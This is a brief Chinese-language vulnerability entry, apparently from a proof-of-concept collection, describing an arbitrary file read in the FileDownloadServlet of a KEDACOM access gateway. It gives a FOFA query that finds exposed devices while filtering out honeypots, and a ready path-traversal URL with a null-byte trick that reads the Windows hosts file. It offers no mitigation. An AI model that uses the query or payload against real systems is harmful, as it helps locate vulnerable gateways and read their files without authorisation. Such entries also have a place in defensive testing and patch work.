# KEADCOM 数字系统接入网关任意文件读取漏洞


KEADCOM 数字系统接入网关 FileDownloadServlet 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件。


fofa：

```
(app="KEDACOM-DVR接入网关") && (is_honeypot=false && is_fraud=false)
```

poc：

```
http://target//gatewayweb/FileDownloadServlet?fileName=pq.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2

```

ref：

https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=3969